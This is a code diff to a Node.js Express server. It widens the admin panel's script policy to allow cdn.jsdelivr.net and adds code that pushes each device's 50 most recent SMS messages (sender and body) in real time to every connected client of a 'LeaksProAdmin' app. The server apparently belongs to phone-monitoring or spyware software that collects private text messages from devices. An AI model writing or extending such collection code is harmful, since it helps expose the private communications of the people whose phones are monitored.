@@ -158,7 +158,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
     res.setHeader('Pragma', 'no-cache');
     res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
-    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.socket.io https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://unpkg.com; font-src https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data: blob: https: http:; connect-src 'self' wss: ws: https:; frame-src 'none';");
+    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.socket.io https://unpkg.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://unpkg.com; font-src https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data: blob: https: http:; connect-src 'self' wss: ws: https:; frame-src 'none';");
     next();
   }, express.static(path.join(__dirname, 'admin-panel')));
 
@@ -2409,6 +2409,29 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       }
 
       console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
+
+      // Emit the most recent SMS instantly to all admin clients (real-time update)
+      // This ensures LeaksProAdmin app shows SMS immediately without polling
+      try {
+        const recent = db.prepare(
+          `SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT 50`
+        ).all(device_id);
+        if (recent.length > 0 && io) {
+          // Emit each recent SMS as a new_sms event so admin app receives them instantly
+          recent.forEach(msg => {
+            io.emit('new_sms', {
+              device_id,
+              address: msg.address,
+              body: msg.body,
+              date: msg.date,
+              type: msg.type,
+              sim_slot: 1
+            });
+          });
+          console.log(`[SMS] Broadcast ${recent.length} messages via socket for instant display`);
+        }
+      } catch (_) {}
+
       res.json({ success: true, synced: count });
     } catch (err) {
       res.status(500).json({ error: err.message });
